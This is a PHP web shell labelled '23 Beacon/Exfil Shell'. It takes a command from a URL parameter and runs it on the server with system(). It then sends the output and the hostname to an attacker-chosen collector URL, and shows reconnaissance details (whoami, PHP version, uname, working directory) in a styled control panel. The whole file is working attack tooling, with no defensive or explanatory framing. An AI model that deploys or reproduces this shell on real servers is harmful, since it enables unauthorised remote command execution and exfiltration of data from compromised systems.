<?php
@error_reporting(0);
$T="23 Beacon/Exfil Shell";
$M="M23-BEACOK";
$ok=true;
$out="";
$c2=isset($_GET['c2'])?(string)$_GET['c2']:'';
$c=isset($_GET['c'])?(string)$_GET['c']:'';
if($c2!==''&&$c!==''){ob_start();@system($c);$r=ob_get_clean(); $d=@file_get_contents($c2.'?d='.urlencode('beacon|'.gethostname().'|'.$r)); $out.='BEACON-SENT to '.$c2.($d!==false?' [collector-ack]':'');}
else{$out.="set c2=<collector url> and c=<cmd>";}

$si='';
$u=@trim((string)@shell_exec('whoami'));
$si.=($u!==''?htmlspecialchars($u):'(no shell_exec)').' | '.@phpversion().' | '.@php_sapi_name().' | '.@htmlspecialchars((string)@php_uname());
$cwd=@getcwd();
$si.=' | cwd='.($cwd!==false?htmlspecialchars($cwd):'n/a');
$S=(string)@$_GET['language'];
$faction=($S!==''?'?':'#');
$hid=($S!==''?'<input type="hidden" name="language" value="'.htmlspecialchars($S).'" /><input type="hidden" name="action" value="go" />':'');

echo '<div style="font-family:Consolas,monospace;font-size:13px;background:#101418;color:#e8e8e8;border:1px solid #3a6ea5;border-radius:6px;padding:10px;margin:8px 0;max-width:1200px;overflow:auto">'
  .'<div style="border-bottom:1px solid #3a6ea5;padding-bottom:6px"><b style="color:#7ce38b">'.$T.'</b> <span style="color:#f6c453">['.$M.']</span> '
  .($ok?'<span style="color:#7ce38b">GATE:OK</span>':'<span style="color:#ff7b72">GATE:LOCKED</span>')
  .'<div style="color:#9aa4af;font-size:12px;margin-top:4px">'.$si.'</div></div>'
  .'<form method="get" action="'.$faction.'" enctype="multipart/form-data" style="margin:8px 0">'.$hid
  .'<table><tr><td>c2</td><td><input type="text" name="c2" value="" size="46"></td><td>cmd</td><td><input type="text" name="c" value="" size="24"></td><td><input type="submit" value="beacon"></td></tr></table><div style="color:#9aa4af;font-size:11px">GET c2?d=<urlencoded host|cmdout> to collector, no local output leak</div>'
  .'</form>'
  .'<pre style="background:#0b0e11;border:1px solid #22303f;color:#d6e2ff;padding:8px;border-radius:4px;overflow:auto;margin:0">'.htmlspecialchars($out).'</pre>'
  .'</div>';
?>
